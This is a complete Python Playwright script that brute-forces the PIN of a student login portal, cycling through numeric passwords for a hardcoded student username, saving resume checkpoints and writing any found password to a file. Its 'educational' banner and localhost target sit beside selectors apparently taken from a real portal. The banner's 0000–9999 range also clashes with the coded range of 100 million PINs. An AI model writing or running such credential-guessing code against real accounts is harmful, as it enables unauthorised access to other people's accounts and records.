"""
=============================================================
  CONCURRENT BRUTE FORCE + PER-WORKER CHECKPOINTS
  EDUCATIONAL USE ONLY
=============================================================
  Target   : http://localhost:5173/login
  Flow     : Click STUDENT card → modal opens → fill
             #username + #password → click Submit anchor
  DO NOT use against any real or unauthorized system.
=============================================================
"""

import json
import os
import time
import sys
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

# ── Configuration ─────────────────────────────────────────────
TARGET_URL        = "http://localhost:5173/login"
USERNAME          = "11900122027"
NUM_WORKERS       = 1
DELAY             = 0.3
HEADLESS          = False
TOTAL_PINS        = 100_000_000
SAVE_EVERY        = 10
CHECKPOINT_PREFIX = "checkpoint"

SUCCESS_BY_URL     = False
SUCCESS_BY_KEYWORD = True
SUCCESS_KEYWORD    = "logout"

# ── Hardcoded selectors ────────────────────────────────────────
OPEN_MODAL_SELECTOR = "a[onclick*='openLoginPage(5)']"
MODAL_SELECTOR      = "div.bootbox.modal"
MODAL_OPEN_SELECTOR = "div.bootbox.modal.in"
USERNAME_SELECTOR   = "div.bootbox #username"
PASSWORD_SELECTOR   = "div.bootbox #password"
SUBMIT_SELECTOR     = "div.bootbox a.btn.btn-success"

# ── Shared state ──────────────────────────────────────────────
found_event  = threading.Event()
found_result = {}
print_lock   = threading.Lock()


# ── Checkpoint helpers ────────────────────────────────────────
def checkpoint_file(worker_id: int) -> str:
    return f"{CHECKPOINT_PREFIX}_{worker_id}.json"


def load_checkpoint(worker_id: int, default_start: int) -> int:
    path = checkpoint_file(worker_id)
    if not os.path.exists(path):
        return default_start
    try:
        with open(path) as f:
            data = json.load(f)
        saved  = int(data.get("last_pin", str(default_start)))
        resume = saved + 1
        with print_lock:
            print(f"  [W{worker_id}] Checkpoint found → resuming from {resume:04d} (saved: {saved:04d})")
        return resume
    except Exception as e:
        with print_lock:
            print(f"  [W{worker_id}] Bad checkpoint ({e}), starting from {default_start:04d}")
        return default_start


def save_checkpoint(worker_id: int, pin_int: int):
    try:
        with open(checkpoint_file(worker_id), "w") as f:
            json.dump({
                "worker_id": worker_id,
                "last_pin":  f"{pin_int:04d}",
                "timestamp": datetime.now().isoformat(),
                "target":    TARGET_URL,
            }, f, indent=2)
    except Exception as e:
        with print_lock:
            print(f"\n  [W{worker_id}] Could not save checkpoint: {e}")


def clear_all_checkpoints():
    for i in range(1, NUM_WORKERS + 1):
        path = checkpoint_file(i)
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception:
            pass
    print("  [✓] All checkpoint files cleared.")


def show_checkpoint_status():
    print()
    print("  Checkpoint status:")
    any_found = False
    for i in range(1, NUM_WORKERS + 1):
        path = checkpoint_file(i)
        if os.path.exists(path):
            try:
                with open(path) as f:
                    data = json.load(f)
                print(f"    {path}: last PIN {data.get('last_pin','?')}  ({data.get('timestamp','')})")
                any_found = True
            except Exception:
                print(f"    {path}: unreadable")
    if not any_found:
        print("    None found — starting fresh from 0000.")
    print()


# ── Success check ─────────────────────────────────────────────
def check_success(page) -> bool:
    try:
        if SUCCESS_BY_URL and "login" not in page.url:
            return True
        if SUCCESS_BY_KEYWORD:
            # Use inner_text to check only visible text, not raw HTML
            body_text = page.inner_text("body").lower()
            if SUCCESS_KEYWORD.lower() in body_text:
                return True
    except Exception:
        pass
    return False


# ── Browser alive check ───────────────────────────────────────
def is_browser_alive(page) -> bool:
    try:
        _ = page.url
        return True
    except Exception:
        return False


# ── Modal open helper ─────────────────────────────────────────
def open_modal(page, worker_id: int) -> bool:
    try:
        if TARGET_URL.rstrip("/") not in page.url:
            page.goto(TARGET_URL, timeout=10_000)
            page.wait_for_load_state("domcontentloaded")
            page.wait_for_timeout(600)

        try:
            cancel = page.query_selector("div.bootbox.modal.in button[data-dismiss='modal']")
            if cancel and cancel.is_visible():
                cancel.click()
                page.wait_for_selector("div.bootbox.modal.in", state="hidden", timeout=3_000)
                page.wait_for_timeout(300)
        except Exception:
            pass

        page.wait_for_selector(OPEN_MODAL_SELECTOR, state="visible", timeout=5_000)
        page.click(OPEN_MODAL_SELECTOR)
        page.wait_for_selector("div.bootbox.modal.in", state="visible", timeout=6_000)
        page.wait_for_timeout(250)

        return True

    except PlaywrightTimeout:
        with print_lock:
            print(f"\n  [W{worker_id}] Timeout — bootbox modal did not open.")
        return False
    except Exception as e:
        with print_lock:
            print(f"\n  [W{worker_id}] Error opening modal: {e}")
        return False


# ── Worker ────────────────────────────────────────────────────
def worker(worker_id: int, chunk_start: int, chunk_end: int):
    start_from = load_checkpoint(worker_id, chunk_start)

    if start_from >= chunk_end:
        with print_lock:
            print(f"  [W{worker_id}] Already completed chunk {chunk_start:04d}-{chunk_end-1:04d}, skipping.")
        return None

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=HEADLESS, slow_mo=20 if not HEADLESS else 0)
        page    = browser.new_page()

        try:
            page.goto(TARGET_URL, timeout=10_000)
            page.wait_for_load_state("domcontentloaded")
        except Exception as e:
            with print_lock:
                print(f"\n  [W{worker_id}] ERROR loading page: {e}")
            browser.close()
            return None

        with print_lock:
            print(f"  [W{worker_id}] Page loaded. Starting PIN attempts...")

        attempts = 0
        last_pin = start_from

        try:
            for pin_int in range(start_from, chunk_end):

                # ── Stop if another worker found it ────────────
                if found_event.is_set():
                    break

                # ── Stop if browser was closed unexpectedly ────
                if not is_browser_alive(page):
                    with print_lock:
                        print(f"\n  [W{worker_id}] Browser closed unexpectedly, stopping.")
                    break

                pin      = f"{pin_int:04d}"
                attempts += 1
                last_pin  = pin_int

                if attempts % SAVE_EVERY == 0:
                    save_checkpoint(worker_id, pin_int)

                with print_lock:
                    print(
                        f"  [W{worker_id}] Trying PIN {pin}  "
                        f"({pin_int - chunk_start + 1}/{chunk_end - chunk_start})",
                        end="\r"
                    )

                try:
                    # ── Step 1: Open the modal ─────────────────
                    if not open_modal(page, worker_id):
                        page.goto(TARGET_URL, timeout=10_000)
                        page.wait_for_load_state("domcontentloaded")
                        if not open_modal(page, worker_id):
                            continue

                    # ── Step 2: Fill username ──────────────────
                    page.fill(USERNAME_SELECTOR, "")
                    page.fill(USERNAME_SELECTOR, USERNAME)

                    # ── Step 3: Fill PIN ───────────────────────
                    page.fill(PASSWORD_SELECTOR, "")
                    page.fill(PASSWORD_SELECTOR, pin)

                    # ── Step 4: Submit ─────────────────────────
                    page.evaluate("postLogin()")

                    page.wait_for_timeout(1_500)

                    # ── Step 5: Check success ──────────────────
                    if check_success(page):
                        found_event.set()
                        found_result["pin"]       = pin
                        found_result["worker_id"] = worker_id
                        save_checkpoint(worker_id, pin_int)
                        with open("result.txt", "w") as f:
                            f.write(f"Username  : {USERNAME}\n")
                            f.write(f"Password  : {pin}\n")
                            f.write(f"Found by  : Worker {worker_id}\n")
                            f.write(f"Found at  : {datetime.now()}\n")
                        with print_lock:
                            print(f"\n\n  [W{worker_id}] ✓ FOUND! PIN = {pin}")
                        browser.close()
                        return pin

                except PlaywrightTimeout:
                    if not is_browser_alive(page):
                        break
                    try:
                        page.goto(TARGET_URL, timeout=10_000)
                        page.wait_for_load_state("domcontentloaded")
                    except Exception:
                        break
                    continue

                except Exception as e:
                    if not is_browser_alive(page):
                        break
                    with print_lock:
                        print(f"\n  [W{worker_id}] Attempt error ({pin}): {e}")
                    continue

                if DELAY > 0:
                    time.sleep(DELAY)

        except KeyboardInterrupt:
            save_checkpoint(worker_id, last_pin)
            with print_lock:
                print(f"\n  [W{worker_id}] Saved at {last_pin:04d}")

        finally:
            try:
                browser.close()
            except Exception:
                pass

        return None


# ── Main ──────────────────────────────────────────────────────
def split_chunks(total, n):
    size = total // n
    return [(i * size, (i + 1) * size if i < n - 1 else total) for i in range(n)]


def run():
    print()
    print("=" * 62)
    print("  STUDENT LOGIN BRUTE FORCE  —  Educational Demo")
    print("=" * 62)
    print(f"  Target   : {TARGET_URL}")
    print(f"  Username : {USERNAME}")
    print(f"  Workers  : {NUM_WORKERS}")
    print(f"  PIN range: 0000 – 9999")
    print(f"  Started  : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 62)

    show_checkpoint_status()

    chunks = split_chunks(TOTAL_PINS, NUM_WORKERS)
    print("  Chunk assignments:")
    for i, (s, e) in enumerate(chunks, 1):
        ckpt = checkpoint_file(i)
        note = ""
        if os.path.exists(ckpt):
            try:
                with open(ckpt) as f:
                    d = json.load(f)
                note = f"  ← will resume from {int(d['last_pin'])+1:04d}"
            except Exception:
                pass
        print(f"    Worker {i}: {s:04d} – {e-1:04d}{note}")
    print()

    start_ts = time.time()

    try:
        with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
            futures = {
                executor.submit(worker, i + 1, chunks[i][0], chunks[i][1]): i + 1
                for i in range(NUM_WORKERS)
            }
            for future in as_completed(futures):
                future.result()

    except KeyboardInterrupt:
        found_event.set()
        time.sleep(1)
        elapsed = time.time() - start_ts
        print(f"\n{'='*62}")
        print(f"  [PAUSED]  Session time: {elapsed:.1f}s")
        for i in range(1, NUM_WORKERS + 1):
            path = checkpoint_file(i)
            if os.path.exists(path):
                try:
                    with open(path) as f:
                        d = json.load(f)
                    print(f"    {path}  →  last PIN {d.get('last_pin','?')}")
                except Exception:
                    print(f"    {path}  →  unreadable")
        print(f"{'='*62}\n")
        sys.exit(0)

    elapsed = time.time() - start_ts
    print()

    if "pin" in found_result:
        print(f"\n{'='*62}")
        print(f"  PASSWORD FOUND!")
        print(f"      Username : {USERNAME}")
        print(f"      Password : {found_result['pin']}")
        print(f"      Found by : Worker {found_result['worker_id']}")
        print(f"      Time     : {elapsed:.1f}s")
        print(f"{'='*62}\n")
        clear_all_checkpoints()
    else:
        print(f"  PIN not found. Checkpoints saved — run again to continue.\n")

    print(f"  Total time : {elapsed:.1f}s\n")


if __name__ == "__main__":
    run()